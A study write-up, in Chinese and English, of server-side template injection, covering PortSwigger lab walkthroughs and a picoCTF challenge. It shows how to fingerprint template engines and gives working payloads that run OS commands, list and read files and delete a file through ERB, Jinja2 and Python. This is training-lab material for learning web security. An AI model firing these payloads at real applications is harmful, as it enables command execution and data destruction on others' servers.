# Server-Side Template Injection

https://portswigger.net/web-security/server-side-template-injection/exploiting

對 Twig, FreeMarker 等框架做 injection

## 機制
```php
$output = $twig->render($_GET['custom_email'],  array("first_name" => $user.first_name) );
```
注入
```
custom_email={{7*7}}

49
```
### 步驟
1. 檢查 SSTI: 注入 `{{5*2}}` 看會不會回傳 `10`
2. 檢查框架
  - {{7*'7'}} would result in 49 in Twig --> php
  - {{7*'7'}} would result in 7777777 in Jinja2 --> python
3. 找框架的 security section，可能會寫不可以...，可以把這個文件當 cheat sheet 用

## Demo
### Lab1
https://portswigger.net/web-security/server-side-template-injection/exploiting/lab-server-side-template-injection-basic <br>
測試一下，可以發現 message 可以被注入 <br>
https://0a3a00f00382d99e807bad12007a00d0.web-security-academy.net/?message=%3C%=7*7%%3E <br>
> 49

之後就開找檔案 <br>
https://0a3a00f00382d99e807bad12007a00d0.web-security-academy.net/?message=%3C%=%20system(%22ls%22)%20%%3E <br>
> morale.txt true

之後達成條件：刪除 morale.txt <br>
https://0a3a00f00382d99e807bad12007a00d0.web-security-academy.net/?message=%3C%=%20File.delete("morale.txt")%20%%3E <br>
> Lab success

### Lab2
https://portswigger.net/web-security/server-side-template-injection/exploiting/lab-server-side-template-injection-basic-code-context<br>
記得用 lab 需求的帳密登入，一開始沒看到戳超久QQ <br>
進入後，可以發現 Preferred name 送出封包為 user.name()，看起來有 SSTI，於是就簡單測了一下
```
blog-post-author-display=7*7&csrf=hQtKf7CiArqjjjwZVcj6BNQoOxPXPEfm
```
>![](webSSTILab2Recc.png)
> 7*7 -> 49

```
blog-post-author-display='7'*7&csrf=hQtKf7CiArqjjjwZVcj6BNQoOxPXPEfm


blog-post-author-display='7*7&csrf=hQtKf7CiArqjjjwZVcj6BNQoOxPXPEfm
```
>![](webSSTILab2Recc2.png)
>![](webSSTILab2Recc3.png)
>可以發現是 python 後端

之後嘗試用
```
blog-post-author-display=dir(__builtins__)&csrf=hQtKf7CiArqjjjwZVcj6BNQoOxPXPEfm
```
> ![](webSSTILab2FindPacketage.png)


單純使用 system('ls') 會遇到 os not defind，所以要加上 `__import__('os')`
```
blog-post-author-display=__import__('os').system('ls')&csrf=2N6vi7b7I2kOpVuWutfwq1WwPMhusd6U
```

```
blog-post-author-display=__import__('os').system('rm morale.txt')&csrf=2N6vi7b7I2kOpVuWutfwq1WwPMhusd6U
```

### Lab3
https://portswigger.net/web-security/server-side-template-injection/exploiting/lab-server-side-template-injection-using-documentation <br>

發現 edit 功能輸入 `${7*7}` 可以成功變成 49，injection 成功<br>
injection 成功後，就開始想辦法找框架，嘗試輸入 `version` 發現有成功噴出 exception

>FreeMarker template error (DEBUG mode; use RETHROW in production!): The following has evaluated to null or missing: ==> version [in template "freemarker" at line 10, column 18] ---- Tip: If the failing expression is known to legally refer to something that's sometimes null or missing, either specify a default value like myOptionalVar!myDefault, or use <#if myOptionalVar??>when-present<#else>when-missing</#if>. (These only cover the last step of the expression; to cover the whole expression, use parenthesis: (myOptionalVar.foo)!myDefault, (myOptionalVar.foo)?? ---- ---- FTL stack trace ("~" means nesting-related): - Failed at: ${version} [in template "freemarker" at line 10, column 16] ---- Java stack trace (for programmers): ---- freemarker.core.InvalidReferenceException: [... Exception message was already printed; see it above ...] at freemarker.core.InvalidReferenceException.getInstance(InvalidReferenceException.java:134) at freemarker.core.EvalUtil.coerceModelToTextualCommon(EvalUtil.java:479) at freemarker.core.EvalUtil.coerceModelToStringOrMarkup(EvalUtil.java:401) at freemarker.core.EvalUtil.coerceModelToStringOrMarkup(EvalUtil.java:370) at freemarker.core.DollarVariable.calculateInterpolatedStringOrMarkup(DollarVariable.java:100) at freemarker.core.DollarVariable.accept(DollarVariable.java:63) at freemarker.core.Environment.visit(Environment.java:331) at freemarker.core.Environment.visit(Environment.java:337) at freemarker.core.Environment.process(Environment.java:310) at freemarker.template.Template.process(Template.java:383) at lab.actions.templateengines.FreeMarker.processInput(FreeMarker.java:58) at lab.actions.templateengines.FreeMarker.act(FreeMarker.java:42) at lab.actions.common.Action.act(Action.java:57) at lab.actions.common.Action.run(Action.java:39) at lab.actions.templateengines.FreeMarker.main(FreeMarker.java:23)

框架：FreeMarker

https://freemarker.apache.org/docs/ref_builtins_expert.html#ref_builtin_new <br>
https://freemarker.apache.org/docs/pgui_datamodel_method.html#pgui_datamodel_method<br>



### picoCTF SSTI1
payload
```twig
{{request.application.__globals__.__builtins__.__import__('os').popen('ls -R').read()}}
```

result
```
.: __pycache__ app.py flag requirements.txt ./__pycache__: app.cpython-38.pyc
```
payload
```
{{request.application.__globals__.__builtins__.__import__('os').popen('cat flag').read()}}
```

